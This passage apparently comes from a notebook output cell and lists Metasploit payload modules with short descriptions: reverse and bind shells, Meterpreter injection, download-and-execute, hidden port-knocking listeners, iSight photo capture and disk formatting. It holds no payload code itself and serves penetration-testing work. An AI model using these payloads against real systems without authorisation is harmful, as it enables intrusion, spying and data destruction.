            "    linux/x64/exec                                      Execute an arbitrary command\n",
            "    linux/x64/meterpreter/bind_tcp                      Inject the mettle server payload (staged). Listen for a connection\n",
            "    linux/x64/meterpreter/reverse_tcp                   Inject the mettle server payload (staged). Connect back to the attacker\n",
            "    linux/x64/meterpreter_reverse_http                  Run the Meterpreter / Mettle server payload (stageless)\n",
            "    linux/x64/meterpreter_reverse_https                 Run the Meterpreter / Mettle server payload (stageless)\n",
            "    linux/x64/meterpreter_reverse_tcp                   Run the Meterpreter / Mettle server payload (stageless)\n",
            "    linux/x64/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection\n",
            "    linux/x64/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker\n",
            "    linux/x64/shell_bind_ipv6_tcp                       Listen for an IPv6 connection and spawn a command shell\n",
            "    linux/x64/shell_bind_tcp                            Listen for a connection and spawn a command shell\n",
            "    linux/x64/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.\n",
            "    linux/x64/shell_find_port                           Spawn a shell on an established connection\n",
            "    linux/x64/shell_reverse_ipv6_tcp                    Connect back to attacker and spawn a command shell over IPv6\n",
            "    linux/x64/shell_reverse_tcp                         Connect back to attacker and spawn a command shell\n",
            "    linux/x86/adduser                                   Create a new user with UID 0\n",
            "    linux/x86/chmod                                     Runs chmod on specified file with specified mode\n",
            "    linux/x86/exec                                      Execute an arbitrary command\n",
            "    linux/x86/meterpreter/bind_ipv6_tcp                 Inject the mettle server payload (staged). Listen for an IPv6 connection (Linux x86)\n",
            "    linux/x86/meterpreter/bind_ipv6_tcp_uuid            Inject the mettle server payload (staged). Listen for an IPv6 connection with UUID Support (Linux x86)\n",
            "    linux/x86/meterpreter/bind_nonx_tcp                 Inject the mettle server payload (staged). Listen for a connection\n",
            "    linux/x86/meterpreter/bind_tcp                      Inject the mettle server payload (staged). Listen for a connection (Linux x86)\n",
            "    linux/x86/meterpreter/bind_tcp_uuid                 Inject the mettle server payload (staged). Listen for a connection with UUID Support (Linux x86)\n",
            "    linux/x86/meterpreter/find_tag                      Inject the mettle server payload (staged). Use an established connection\n",
            "    linux/x86/meterpreter/reverse_ipv6_tcp              Inject the mettle server payload (staged). Connect back to attacker over IPv6\n",
            "    linux/x86/meterpreter/reverse_nonx_tcp              Inject the mettle server payload (staged). Connect back to the attacker\n",
            "    linux/x86/meterpreter/reverse_tcp                   Inject the mettle server payload (staged). Connect back to the attacker\n",
            "    linux/x86/meterpreter/reverse_tcp_uuid              Inject the mettle server payload (staged). Connect back to the attacker\n",
            "    linux/x86/meterpreter_reverse_http                  Run the Meterpreter / Mettle server payload (stageless)\n",
            "    linux/x86/meterpreter_reverse_https                 Run the Meterpreter / Mettle server payload (stageless)\n",
            "    linux/x86/meterpreter_reverse_tcp                   Run the Meterpreter / Mettle server payload (stageless)\n",
            "    linux/x86/metsvc_bind_tcp                           Stub payload for interacting with a Meterpreter Service\n",
            "    linux/x86/metsvc_reverse_tcp                        Stub payload for interacting with a Meterpreter Service\n",
            "    linux/x86/read_file                                 Read up to 4096 bytes from the local file system and write it back out to the specified file descriptor\n",
            "    linux/x86/shell/bind_ipv6_tcp                       Spawn a command shell (staged). Listen for an IPv6 connection (Linux x86)\n",
            "    linux/x86/shell/bind_ipv6_tcp_uuid                  Spawn a command shell (staged). Listen for an IPv6 connection with UUID Support (Linux x86)\n",
            "    linux/x86/shell/bind_nonx_tcp                       Spawn a command shell (staged). Listen for a connection\n",
            "    linux/x86/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection (Linux x86)\n",
            "    linux/x86/shell/bind_tcp_uuid                       Spawn a command shell (staged). Listen for a connection with UUID Support (Linux x86)\n",
            "    linux/x86/shell/find_tag                            Spawn a command shell (staged). Use an established connection\n",
            "    linux/x86/shell/reverse_ipv6_tcp                    Spawn a command shell (staged). Connect back to attacker over IPv6\n",
            "    linux/x86/shell/reverse_nonx_tcp                    Spawn a command shell (staged). Connect back to the attacker\n",
            "    linux/x86/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker\n",
            "    linux/x86/shell/reverse_tcp_uuid                    Spawn a command shell (staged). Connect back to the attacker\n",
            "    linux/x86/shell_bind_ipv6_tcp                       Listen for a connection over IPv6 and spawn a command shell\n",
            "    linux/x86/shell_bind_tcp                            Listen for a connection and spawn a command shell\n",
            "    linux/x86/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.\n",
            "    linux/x86/shell_find_port                           Spawn a shell on an established connection\n",
            "    linux/x86/shell_find_tag                            Spawn a shell on an established connection (proxy/nat safe)\n",
            "    linux/x86/shell_reverse_tcp                         Connect back to attacker and spawn a command shell\n",
            "    linux/x86/shell_reverse_tcp_ipv6                    Connect back to attacker and spawn a command shell over IPv6\n",
            "    linux/zarch/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload (stageless)\n",
            "    linux/zarch/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload (stageless)\n",
            "    linux/zarch/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless)\n",
            "    mainframe/shell_reverse_tcp                         Listen for a connection and spawn a command shell. This implementation does not include ebcdic character translation, so a client with translation capabilities is required. MSF handles this automatically.\n",
            "    multi/meterpreter/reverse_http                      Handle Meterpreter sessions regardless of the target arch/platform. Tunnel communication over HTTP\n",
            "    multi/meterpreter/reverse_https                     Handle Meterpreter sessions regardless of the target arch/platform. Tunnel communication over HTTPS\n",
            "    netware/shell/reverse_tcp                           Connect to the NetWare console (staged). Connect back to the attacker\n",
            "    nodejs/shell_bind_tcp                               Creates an interactive shell via nodejs\n",
            "    nodejs/shell_reverse_tcp                            Creates an interactive shell via nodejs\n",
            "    nodejs/shell_reverse_tcp_ssl                        Creates an interactive shell via nodejs, uses SSL\n",
            "    osx/armle/execute/bind_tcp                          Spawn a command shell (staged). Listen for a connection\n",
            "    osx/armle/execute/reverse_tcp                       Spawn a command shell (staged). Connect back to the attacker\n",
            "    osx/armle/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection\n",
            "    osx/armle/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker\n",
            "    osx/armle/shell_bind_tcp                            Listen for a connection and spawn a command shell\n",
            "    osx/armle/shell_reverse_tcp                         Connect back to attacker and spawn a command shell\n",
            "    osx/armle/vibrate                                   Causes the iPhone to vibrate, only works when the AudioToolkit library has been loaded. Based on work by Charlie Miller <cmiller[at]securityevaluators.com>.\n",
            "    osx/ppc/shell/bind_tcp                              Spawn a command shell (staged). Listen for a connection\n",
            "    osx/ppc/shell/find_tag                              Spawn a command shell (staged). Use an established connection\n",
            "    osx/ppc/shell/reverse_tcp                           Spawn a command shell (staged). Connect back to the attacker\n",
            "    osx/ppc/shell_bind_tcp                              Listen for a connection and spawn a command shell\n",
            "    osx/ppc/shell_reverse_tcp                           Connect back to attacker and spawn a command shell\n",
            "    osx/x64/dupandexecve/bind_tcp                       dup2 socket in edi, then execve. Listen, read length, read buffer, execute\n",
            "    osx/x64/dupandexecve/reverse_tcp                    dup2 socket in edi, then execve. Connect, read length, read buffer, execute\n",
            "    osx/x64/exec                                        Execute an arbitrary command\n",
            "    osx/x64/meterpreter/bind_tcp                        Inject the mettle server payload (staged). Listen, read length, read buffer, execute\n",
            "    osx/x64/meterpreter/reverse_tcp                     Inject the mettle server payload (staged). Connect, read length, read buffer, execute\n",
            "    osx/x64/meterpreter_reverse_http                    Run the Meterpreter / Mettle server payload (stageless)\n",
            "    osx/x64/meterpreter_reverse_https                   Run the Meterpreter / Mettle server payload (stageless)\n",
            "    osx/x64/meterpreter_reverse_tcp                     Run the Meterpreter / Mettle server payload (stageless)\n",
            "    osx/x64/say                                         Say an arbitrary string outloud using Mac OS X text2speech\n",
            "    osx/x64/shell_bind_tcp                              Bind an arbitrary command to an arbitrary port\n",
            "    osx/x64/shell_find_tag                              Spawn a shell on an established connection (proxy/nat safe)\n",
            "    osx/x64/shell_reverse_tcp                           Connect back to attacker and spawn a command shell\n",
            "    osx/x86/bundleinject/bind_tcp                       Inject a custom Mach-O bundle into the exploited process. Listen, read length, read buffer, execute\n",
            "    osx/x86/bundleinject/reverse_tcp                    Inject a custom Mach-O bundle into the exploited process. Connect, read length, read buffer, execute\n",
            "    osx/x86/exec                                        Execute an arbitrary command\n",
            "    osx/x86/isight/bind_tcp                             Inject a Mach-O bundle to capture a photo from the iSight (staged). Listen, read length, read buffer, execute\n",
            "    osx/x86/isight/reverse_tcp                          Inject a Mach-O bundle to capture a photo from the iSight (staged). Connect, read length, read buffer, execute\n",
            "    osx/x86/shell_bind_tcp                              Listen for a connection and spawn a command shell\n",
            "    osx/x86/shell_find_port                             Spawn a shell on an established connection\n",
            "    osx/x86/shell_reverse_tcp                           Connect back to attacker and spawn a command shell\n",
            "    osx/x86/vforkshell/bind_tcp                         Call vfork() if necessary and spawn a command shell (staged). Listen, read length, read buffer, execute\n",
            "    osx/x86/vforkshell/reverse_tcp                      Call vfork() if necessary and spawn a command shell (staged). Connect, read length, read buffer, execute\n",
            "    osx/x86/vforkshell_bind_tcp                         Listen for a connection, vfork if necessary, and spawn a command shell\n",
            "    osx/x86/vforkshell_reverse_tcp                      Connect back to attacker, vfork if necessary, and spawn a command shell\n",
            "    php/bind_perl                                       Listen for a connection and spawn a command shell via perl (persistent)\n",
            "    php/bind_perl_ipv6                                  Listen for a connection and spawn a command shell via perl (persistent) over IPv6\n",
            "    php/bind_php                                        Listen for a connection and spawn a command shell via php\n",
            "    php/bind_php_ipv6                                   Listen for a connection and spawn a command shell via php (IPv6)\n",
            "    php/download_exec                                   Download an EXE from an HTTP URL and execute it\n",
            "    php/exec                                            Execute a single system command\n",
            "    php/meterpreter/bind_tcp                            Run a meterpreter server in PHP. Listen for a connection\n",
            "    php/meterpreter/bind_tcp_ipv6                       Run a meterpreter server in PHP. Listen for a connection over IPv6\n",
            "    php/meterpreter/bind_tcp_ipv6_uuid                  Run a meterpreter server in PHP. Listen for a connection over IPv6 with UUID Support\n",
            "    php/meterpreter/bind_tcp_uuid                       Run a meterpreter server in PHP. Listen for a connection with UUID Support\n",
            "    php/meterpreter/reverse_tcp                         Run a meterpreter server in PHP. Reverse PHP connect back stager with checks for disabled functions\n",
            "    php/meterpreter/reverse_tcp_uuid                    Run a meterpreter server in PHP. Reverse PHP connect back stager with checks for disabled functions\n",
            "    php/meterpreter_reverse_tcp                         Connect back to attacker and spawn a Meterpreter server (PHP)\n",
            "    php/reverse_perl                                    Creates an interactive shell via perl\n",
            "    php/reverse_php                                     Reverse PHP connect back shell with checks for disabled functions\n",
            "    php/shell_findsock                                  Spawn a shell on the established connection to the webserver. Unfortunately, this payload can leave conspicuous evil-looking entries in the apache error logs, so it is probably a good idea to use a bind or reverse shell unless firewalls prevent them from working. The issue this payload takes advantage of (CLOEXEC flag not set on sockets) appears to have been patched on the Ubuntu version of Apache and may not work on other Debian-based distributions. Only tested on Apache but it might work on other web servers that leak file descriptors to child processes.\n",
            "    python/meterpreter/bind_tcp                         Run a meterpreter server in Python (2.5-2.7 & 3.1-3.6). Listen for a connection\n",
            "    python/meterpreter/bind_tcp_uuid                    Run a meterpreter server in Python (2.5-2.7 & 3.1-3.6). Listen for a connection with UUID Support\n",
            "    python/meterpreter/reverse_http                     Run a meterpreter server in Python (2.5-2.7 & 3.1-3.6). Tunnel communication over HTTP\n",
            "    python/meterpreter/reverse_https                    Run a meterpreter server in Python (2.5-2.7 & 3.1-3.6). Tunnel communication over HTTP using SSL\n",
            "    python/meterpreter/reverse_tcp                      Run a meterpreter server in Python (2.5-2.7 & 3.1-3.6). Connect back to the attacker\n",
            "    python/meterpreter/reverse_tcp_ssl                  Run a meterpreter server in Python (2.5-2.7 & 3.1-3.6). Reverse Python connect back stager using SSL\n",
            "    python/meterpreter/reverse_tcp_uuid                 Run a meterpreter server in Python (2.5-2.7 & 3.1-3.6). Connect back to the attacker with UUID Support\n",
            "    python/meterpreter_bind_tcp                         Connect to the victim and spawn a Meterpreter shell\n",
            "    python/meterpreter_reverse_http                     Connect back to the attacker and spawn a Meterpreter shell\n",
            "    python/meterpreter_reverse_https                    Connect back to the attacker and spawn a Meterpreter shell\n",
            "    python/meterpreter_reverse_tcp                      Connect back to the attacker and spawn a Meterpreter shell\n",
            "    python/shell_bind_tcp                               Creates an interactive shell via python, encodes with base64 by design\n",
            "    python/shell_reverse_tcp                            Creates an interactive shell via python, encodes with base64 by design. Compatible with Python 2.3.3\n",
            "    python/shell_reverse_tcp_ssl                        Creates an interactive shell via python, uses SSL, encodes with base64 by design.\n",
            "    python/shell_reverse_udp                            Creates an interactive shell via python, encodes with base64 by design. Compatible with Python 2.3.3\n",
            "    r/shell_bind_tcp                                    Continually listen for a connection and spawn a command shell via R\n",
            "    r/shell_reverse_tcp                                 Connect back and create a command shell via R\n",
            "    ruby/shell_bind_tcp                                 Continually listen for a connection and spawn a command shell via Ruby\n",
            "    ruby/shell_bind_tcp_ipv6                            Continually listen for a connection and spawn a command shell via Ruby\n",
            "    ruby/shell_reverse_tcp                              Connect back and create a command shell via Ruby\n",
            "    ruby/shell_reverse_tcp_ssl                          Connect back and create a command shell via Ruby, uses SSL\n",
            "    solaris/sparc/shell_bind_tcp                        Listen for a connection and spawn a command shell\n",
            "    solaris/sparc/shell_find_port                       Spawn a shell on an established connection\n",
            "    solaris/sparc/shell_reverse_tcp                     Connect back to attacker and spawn a command shell\n",
            "    solaris/x86/shell_bind_tcp                          Listen for a connection and spawn a command shell\n",
            "    solaris/x86/shell_find_port                         Spawn a shell on an established connection\n",
            "    solaris/x86/shell_reverse_tcp                       Connect back to attacker and spawn a command shell\n",
            "    tty/unix/interact                                   Interacts with a TTY on an established socket connection\n",
            "    windows/adduser                                     Create a new user and add them to local administration group. Note: The specified password is checked for common complexity requirements to prevent the target machine rejecting the user for failing to meet policy requirements. Complexity check: 8-14 chars (1 UPPER, 1 lower, 1 digit/special)\n",
            "    windows/dllinject/bind_hidden_ipknock_tcp           Inject a DLL via a reflective loader. Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as \"closed,\" thus helping to hide the shellcode\n",
            "    windows/dllinject/bind_hidden_tcp                   Inject a DLL via a reflective loader. Listen for a connection from a hidden port and spawn a command shell to the allowed host.\n",
            "    windows/dllinject/bind_ipv6_tcp                     Inject a DLL via a reflective loader. Listen for an IPv6 connection (Windows x86)\n",
            "    windows/dllinject/bind_ipv6_tcp_uuid                Inject a DLL via a reflective loader. Listen for an IPv6 connection with UUID Support (Windows x86)\n",
            "    windows/dllinject/bind_named_pipe                   Inject a DLL via a reflective loader. Listen for a pipe connection (Windows x86)\n",
            "    windows/dllinject/bind_nonx_tcp                     Inject a DLL via a reflective loader. Listen for a connection (No NX)\n",
            "    windows/dllinject/bind_tcp                          Inject a DLL via a reflective loader. Listen for a connection (Windows x86)\n",
            "    windows/dllinject/bind_tcp_rc4                      Inject a DLL via a reflective loader. Listen for a connection\n",
            "    windows/dllinject/bind_tcp_uuid                     Inject a DLL via a reflective loader. Listen for a connection with UUID Support (Windows x86)\n",
            "    windows/dllinject/find_tag                          Inject a DLL via a reflective loader. Use an established connection\n",
            "    windows/dllinject/reverse_hop_http                  Inject a DLL via a reflective loader. Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data/hop/hop.php to the PHP server you wish to use as a hop.\n",
            "    windows/dllinject/reverse_http                      Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows wininet)\n",
            "    windows/dllinject/reverse_http_proxy_pstore         Inject a DLL via a reflective loader. Tunnel communication over HTTP\n",
            "    windows/dllinject/reverse_ipv6_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker over IPv6\n",
            "    windows/dllinject/reverse_nonx_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker (No NX)\n",
            "    windows/dllinject/reverse_ord_tcp                   Inject a DLL via a reflective loader. Connect back to the attacker\n",
            "    windows/dllinject/reverse_tcp                       Inject a DLL via a reflective loader. Connect back to the attacker\n",
            "    windows/dllinject/reverse_tcp_allports              Inject a DLL via a reflective loader. Try to connect back to the attacker, on all possible ports (1-65535, slowly)\n",
            "    windows/dllinject/reverse_tcp_dns                   Inject a DLL via a reflective loader. Connect back to the attacker\n",
            "    windows/dllinject/reverse_tcp_rc4                   Inject a DLL via a reflective loader. Connect back to the attacker\n",
            "    windows/dllinject/reverse_tcp_rc4_dns               Inject a DLL via a reflective loader. Connect back to the attacker\n",
            "    windows/dllinject/reverse_tcp_uuid                  Inject a DLL via a reflective loader. Connect back to the attacker with UUID Support\n",
            "    windows/dllinject/reverse_winhttp                   Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows winhttp)\n",
            "    windows/dns_txt_query_exec                          Performs a TXT query against a series of DNS record(s) and executes the returned payload\n",
            "    windows/download_exec                               Download an EXE from an HTTP(S)/FTP URL and execute it\n",
            "    windows/exec                                        Execute an arbitrary command\n",
            "    windows/format_all_drives                           This payload formats all mounted disks in Windows (aka ShellcodeOfDeath). After formatting, this payload sets the volume label to the string specified in the VOLUMELABEL option. If the code is unable to access a drive for any reason, it skips the drive and proceeds to the next volume.\n",
            "    windows/loadlibrary                                 Load an arbitrary library path\n",
            "    windows/messagebox                                  Spawns a dialog via MessageBox using a customizable title, text & icon\n",
            "    windows/meterpreter/bind_hidden_ipknock_tcp         Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as \"closed,\" thus helping to hide the shellcode\n",
            "    windows/meterpreter/bind_hidden_tcp                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for a connection from a hidden port and spawn a command shell to the allowed host.\n",
            "    windows/meterpreter/bind_ipv6_tcp                   Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for an IPv6 connection (Windows x86)\n",
            "    windows/meterpreter/bind_ipv6_tcp_uuid              Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for an IPv6 connection with UUID Support (Windows x86)\n",
            "    windows/meterpreter/bind_named_pipe                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for a pipe connection (Windows x86)\n",
            "    windows/meterpreter/bind_nonx_tcp                   Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for a connection (No NX)\n",
            "    windows/meterpreter/bind_tcp                        Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for a connection (Windows x86)\n",
            "    windows/meterpreter/bind_tcp_rc4                    Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for a connection\n",
            "    windows/meterpreter/bind_tcp_uuid                   Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Listen for a connection with UUID Support (Windows x86)\n",
            "    windows/meterpreter/find_tag                        Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Use an established connection\n",
            "    windows/meterpreter/reverse_hop_http                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data/hop/hop.php to the PHP server you wish to use as a hop.\n",
            "    windows/meterpreter/reverse_http                    Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Tunnel communication over HTTP (Windows wininet)\n",
            "    windows/meterpreter/reverse_http_proxy_pstore       Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Tunnel communication over HTTP\n",
            "    windows/meterpreter/reverse_https                   Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Tunnel communication over HTTPS (Windows wininet)\n",
            "    windows/meterpreter/reverse_https_proxy             Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Tunnel communication over HTTP using SSL with custom proxy support\n",
            "    windows/meterpreter/reverse_ipv6_tcp                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker over IPv6\n",
            "    windows/meterpreter/reverse_named_pipe              Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker via a named pipe pivot\n",
            "    windows/meterpreter/reverse_nonx_tcp                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker (No NX)\n",
            "    windows/meterpreter/reverse_ord_tcp                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker\n",
            "    windows/meterpreter/reverse_tcp                     Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker\n",
            "    windows/meterpreter/reverse_tcp_allports            Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)\n",
            "    windows/meterpreter/reverse_tcp_dns                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker\n",
            "    windows/meterpreter/reverse_tcp_rc4                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker\n",
            "    windows/meterpreter/reverse_tcp_rc4_dns             Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker\n",
            "    windows/meterpreter/reverse_tcp_uuid                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Connect back to the attacker with UUID Support\n",
            "    windows/meterpreter/reverse_winhttp                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Tunnel communication over HTTP (Windows winhttp)\n",
            "    windows/meterpreter/reverse_winhttps                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Tunnel communication over HTTPS (Windows winhttp)\n",
            "    windows/meterpreter_bind_named_pipe                 Connect to victim and spawn a Meterpreter shell\n",
            "    windows/meterpreter_bind_tcp                        Connect to victim and spawn a Meterpreter shell\n",
            "    windows/meterpreter_reverse_http                    Connect back to attacker and spawn a Meterpreter shell\n",
            "    windows/meterpreter_reverse_https                   Connect back to attacker and spawn a Meterpreter shell\n",
            "    windows/meterpreter_reverse_ipv6_tcp                Connect back to attacker and spawn a Meterpreter shell\n",
            "    windows/meterpreter_reverse_tcp                     Connect back to attacker and spawn a Meterpreter shell\n",
            "    windows/metsvc_bind_tcp                             Stub payload for interacting with a Meterpreter Service\n",
            "    windows/metsvc_reverse_tcp                          Stub payload for interacting with a Meterpreter Service\n",
            "    windows/patchupdllinject/bind_hidden_ipknock_tcp    Inject a custom DLL into the exploited process. Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as \"closed,\" thus helping to hide the shellcode\n",
            "    windows/patchupdllinject/bind_hidden_tcp            Inject a custom DLL into the exploited process. Listen for a connection from a hidden port and spawn a command shell to the allowed host.\n",
            "    windows/patchupdllinject/bind_ipv6_tcp              Inject a custom DLL into the exploited process. Listen for an IPv6 connection (Windows x86)\n",
            "    windows/patchupdllinject/bind_ipv6_tcp_uuid         Inject a custom DLL into the exploited process. Listen for an IPv6 connection with UUID Support (Windows x86)\n",
            "    windows/patchupdllinject/bind_named_pipe            Inject a custom DLL into the exploited process. Listen for a pipe connection (Windows x86)\n",
            "    windows/patchupdllinject/bind_nonx_tcp              Inject a custom DLL into the exploited process. Listen for a connection (No NX)\n",
            "    windows/patchupdllinject/bind_tcp                   Inject a custom DLL into the exploited process. Listen for a connection (Windows x86)\n",
            "    windows/patchupdllinject/bind_tcp_rc4               Inject a custom DLL into the exploited process. Listen for a connection\n",
            "    windows/patchupdllinject/bind_tcp_uuid              Inject a custom DLL into the exploited process. Listen for a connection with UUID Support (Windows x86)\n",
            "    windows/patchupdllinject/find_tag                   Inject a custom DLL into the exploited process. Use an established connection\n",
            "    windows/patchupdllinject/reverse_ipv6_tcp           Inject a custom DLL into the exploited process. Connect back to the attacker over IPv6\n",
            "    windows/patchupdllinject/reverse_nonx_tcp           Inject a custom DLL into the exploited process. Connect back to the attacker (No NX)\n",
            "    windows/patchupdllinject/reverse_ord_tcp            Inject a custom DLL into the exploited process. Connect back to the attacker\n",
            "    windows/patchupdllinject/reverse_tcp                Inject a custom DLL into the exploited process. Connect back to the attacker\n",
            "    windows/patchupdllinject/reverse_tcp_allports       Inject a custom DLL into the exploited process. Try to connect back to the attacker, on all possible ports (1-65535, slowly)\n",
            "    windows/patchupdllinject/reverse_tcp_dns            Inject a custom DLL into the exploited process. Connect back to the attacker\n",
            "    windows/patchupdllinject/reverse_tcp_rc4            Inject a custom DLL into the exploited process. Connect back to the attacker\n",
            "    windows/patchupdllinject/reverse_tcp_rc4_dns        Inject a custom DLL into the exploited process. Connect back to the attacker\n",
            "    windows/patchupdllinject/reverse_tcp_uuid           Inject a custom DLL into the exploited process. Connect back to the attacker with UUID Support\n",
            "    windows/patchupmeterpreter/bind_hidden_ipknock_tcp  Inject the meterpreter server DLL (staged). Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as \"closed,\" thus helping to hide the shellcode\n",
            "    windows/patchupmeterpreter/bind_hidden_tcp          Inject the meterpreter server DLL (staged). Listen for a connection from a hidden port and spawn a command shell to the allowed host.\n",
            "    windows/patchupmeterpreter/bind_ipv6_tcp            Inject the meterpreter server DLL (staged). Listen for an IPv6 connection (Windows x86)\n",
            "    windows/patchupmeterpreter/bind_ipv6_tcp_uuid       Inject the meterpreter server DLL (staged). Listen for an IPv6 connection with UUID Support (Windows x86)\n",
            "    windows/patchupmeterpreter/bind_named_pipe          Inject the meterpreter server DLL (staged). Listen for a pipe connection (Windows x86)\n",
            "    windows/patchupmeterpreter/bind_nonx_tcp            Inject the meterpreter server DLL (staged). Listen for a connection (No NX)\n",
            "    windows/patchupmeterpreter/bind_tcp                 Inject the meterpreter server DLL (staged). Listen for a connection (Windows x86)\n",
            "    windows/patchupmeterpreter/bind_tcp_rc4             Inject the meterpreter server DLL (staged). Listen for a connection\n",
            "    windows/patchupmeterpreter/bind_tcp_uuid            Inject the meterpreter server DLL (staged). Listen for a connection with UUID Support (Windows x86)\n",
            "    windows/patchupmeterpreter/find_tag                 Inject the meterpreter server DLL (staged). Use an established connection\n",
            "    windows/patchupmeterpreter/reverse_ipv6_tcp         Inject the meterpreter server DLL (staged). Connect back to the attacker over IPv6\n",
            "    windows/patchupmeterpreter/reverse_nonx_tcp         Inject the meterpreter server DLL (staged). Connect back to the attacker (No NX)\n",
            "    windows/patchupmeterpreter/reverse_ord_tcp          Inject the meterpreter server DLL (staged). Connect back to the attacker\n",
            "    windows/patchupmeterpreter/reverse_tcp              Inject the meterpreter server DLL (staged). Connect back to the attacker\n",
            "    windows/patchupmeterpreter/reverse_tcp_allports     Inject the meterpreter server DLL (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)\n",
            "    windows/patchupmeterpreter/reverse_tcp_dns          Inject the meterpreter server DLL (staged). Connect back to the attacker\n",
            "    windows/patchupmeterpreter/reverse_tcp_rc4          Inject the meterpreter server DLL (staged). Connect back to the attacker\n",
            "    windows/patchupmeterpreter/reverse_tcp_rc4_dns      Inject the meterpreter server DLL (staged). Connect back to the attacker\n",
            "    windows/patchupmeterpreter/reverse_tcp_uuid         Inject the meterpreter server DLL (staged). Connect back to the attacker with UUID Support\n",
            "    windows/powershell_bind_tcp                         Listen for a connection and spawn an interactive powershell session\n",
            "    windows/powershell_reverse_tcp                      Listen for a connection and spawn an interactive powershell session\n",
            "    windows/shell/bind_hidden_ipknock_tcp               Spawn a piped command shell (staged). Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as \"closed,\" thus helping to hide the shellcode\n",
            "    windows/shell/bind_hidden_tcp                       Spawn a piped command shell (staged). Listen for a connection from a hidden port and spawn a command shell to the allowed host.\n",
            "    windows/shell/bind_ipv6_tcp                         Spawn a piped command shell (staged). Listen for an IPv6 connection (Windows x86)\n",
            "    windows/shell/bind_ipv6_tcp_uuid                    Spawn a piped command shell (staged). Listen for an IPv6 connection with UUID Support (Windows x86)\n",
            "    windows/shell/bind_named_pipe                       Spawn a piped command shell (staged). Listen for a pipe connection (Windows x86)\n",
            "    windows/shell/bind_nonx_tcp                         Spawn a piped command shell (staged). Listen for a connection (No NX)\n",
            "    windows/shell/bind_tcp                              Spawn a piped command shell (staged). Listen for a connection (Windows x86)\n",
            "    windows/shell/bind_tcp_rc4                          Spawn a piped command shell (staged). Listen for a connection\n",
            "    windows/shell/bind_tcp_uuid                         Spawn a piped command shell (staged). Listen for a connection with UUID Support (Windows x86)\n",
            "    windows/shell/find_tag                              Spawn a piped command shell (staged). Use an established connection\n",
            "    windows/shell/reverse_ipv6_tcp                      Spawn a piped command shell (staged). Connect back to the attacker over IPv6\n",
            "    windows/shell/reverse_nonx_tcp                      Spawn a piped command shell (staged). Connect back to the attacker (No NX)\n",
            "    windows/shell/reverse_ord_tcp                       Spawn a piped command shell (staged). Connect back to the attacker\n",
            "    windows/shell/reverse_tcp                           Spawn a piped command shell (staged). Connect back to the attacker\n",
            "    windows/shell/reverse_tcp_allports                  Spawn a piped command shell (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)\n",
            "    windows/shell/reverse_tcp_dns                       Spawn a piped command shell (staged). Connect back to the attacker\n",
            "    windows/shell/reverse_tcp_rc4                       Spawn a piped command shell (staged). Connect back to the attacker\n",
            "    windows/shell/reverse_tcp_rc4_dns                   Spawn a piped command shell (staged). Connect back to the attacker\n",
            "    windows/shell/reverse_tcp_uuid                      Spawn a piped command shell (staged). Connect back to the attacker with UUID Support\n",
